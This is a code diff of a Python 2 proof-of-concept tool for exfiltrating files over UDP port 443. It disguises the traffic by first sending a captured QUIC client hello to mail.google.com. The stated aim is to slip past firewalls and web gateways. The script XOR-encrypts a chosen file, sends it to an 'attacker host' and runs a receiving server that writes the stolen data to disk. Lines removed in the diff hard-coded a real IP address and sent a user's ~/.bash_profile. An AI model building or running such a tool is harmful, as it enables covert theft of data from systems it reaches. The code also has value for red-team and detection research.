@@ -1,19 +1,36 @@
 import socket
 import base64
+import sys
+import time
+import optparse
+from itertools import cycle, izip
 
-class Quicker(object):
-    def __init__(self, host, port):
-        self.host = host
-        self.port = port
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.sock.connect((self.host, self.port))
-        self.enc_key = "johnny5isalive"
-        self.mtu = 459
-        self.__init_fake_quic()
+'''
+    POC for data exfiltration using QUIC. https://attack.mitre.org/wiki/Technique/T1048
+    Why use QUIC for exfiltration? Most (if not all) IPS/NG firewallas/Secure Web Gateways are ignoring QUIC. It is 
+    not inspected and furthermore not monitored or blocked. 
+    
+    The POC code starts by sending a real QUIC client hello and follows it by a stream of encrypted exfiltrated data. 
+     
+    Preconditions: Any OS running python. Server side must be executed as root (listenes on port < 1024) 
+    
+    Postconditions: file is transfered to the attacker
+    
+    Known issues: There is no data integrity validation since it is UDP and not a full QUIC implementation 
+    
+    Usage:
+        Start server:
+        sudo python quic_exfiltrate.py --server --encrypt johnny
+        
+        Send data:
+        python quic_exfiltrate.py --host 127.0.0.1 --filename r.txt --encrypt johnny
+    
+    
+    
+'''
 
 
-    def __init_fake_quic(self):
-        bogus_quic =    (
+bogus_quic =    (
                         "0db2de5df14f5545eb51303234013b6e8986f83cf3b7a6ab5d0501a001000443484c4f180000005041440087010000534e49"+
                         "009601000053544b00d001000056455200d401000043435300e40100004e4f4e43040200004d53504308020000414541440c"+
                         "02000055414944240200005343494434020000544349443802000050444d443c02000053524246400200004943534c440200"+
@@ -50,31 +67,85 @@ class Quicker(object):
                         "4da52a3e842a8072893cc64068968e21747fd3ab79fe658defdc00439b887e3fec4af9c5daf03e5a0f82b7eeeeda230aff58"+
                         "4e018d3f10ed29867b9662e867c4deeb9a38d888a2a9ce36fe5989f3087a1c81b4baab8bbc5667213fca9dd849a6b3b0a44a"+
                         "dcd857f0805192849df4af6a353f45a55f8e1cfd82236b5b70ebe41d4cbbbcc8c0c14112"
-                        )
-        self.send_buffer(bogus_quic.decode('hex'))
+                        ).decode('hex')
+
+class QuickerServer(object):
+    def __init__(self,enc_key=False):
+        self.enc_key = enc_key
+        self.sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+        self.sock.bind(('0.0.0.0', 443))
+        self.recieve()
+
+    def recieve(self):
+        buff = ''
+        while True:
+            data, addr = self.sock.recvfrom(1024)
+            buff += data
+            if buff.find(bogus_quic,1)>-1:
+                break
+        data = buff[len(bogus_quic):-len(bogus_quic)]
+
+        with open('exf_%d' % time.time(),'w') as f:
+            if self.enc_key is not False:
+                data = self.decrypt(data)
+            f.write(data)
+
+
+    def decrypt(self,buff):
+        return ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(buff, cycle(self.enc_key)))
+
+
+
+class Quicker(object):
+    def __init__(self, host, port,enc_key=False):
+        self.host = host
+        self.port = port
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        self.sock.connect((self.host, self.port))
+        self.enc_key = enc_key
+        self.mtu = 459
+        self.__init_fake_quic()
+
+
+    def __init_fake_quic(self):
+        ''' real quic client hello to mail.google.com (this could trick any url filtering solution if it parses the SNI
+        field'''
+        self.send_buffer(bogus_quic)
 
     def send_buffer(self, buff):
         for i in range(0, len(buff), self.mtu):
             self.sock.send(buff[i:i + self.mtu])
 
     def encrypt(self, buff):
-        enc = []
-        for i in range(len(buff)):
-            key_c = self.enc_key[i % len(self.enc_key)]
-            enc_c = chr((ord(buff[i]) + ord(key_c)) % 256)
-            enc.append(enc_c)
-        return base64.urlsafe_b64encode("".join(enc))
+        return ''.join(chr(ord(c) ^ ord(k)) for c, k in izip(buff, cycle(self.enc_key)))
+
 
     def send_file(self,fname):
         try:
             with open(fname) as f:
-                buff = self.encrypt(f.read())
+                buff = f.read()
+                if self.enc_key is not False:
+                    buff = self.encrypt(buff)
                 self.send_buffer(buff)
+            self.send_buffer(bogus_quic) # marks end of transfer
         except:
             pass
 
+def get_options():
+    parser = optparse.OptionParser( description='Utility to send files over QUIC' )
+    parser.add_option('--host', action="store", help="Attacker host")
+    parser.add_option('--filename', action="store", help="Exfiltrated file")
+    parser.add_option('--server', action="store_true", help="Activate server", default = False)
+    parser.add_option('--encrypt', action="store", help="Encrypt data",default=False)
+    args, _ = parser.parse_args()
+
+    return args, _
 
 if __name__ == "__main__":
-    a=Quicker('162.210.102.221',443)
-    a.send_file('~/.bash_profile')
+    args, _ = get_options()
+    if args.server:
+        QuickerServer(enc_key=args.encrypt)
+    else:
+        a=Quicker(args.host,443,enc_key=args.encrypt)
+        a.send_file(args.filename)
 
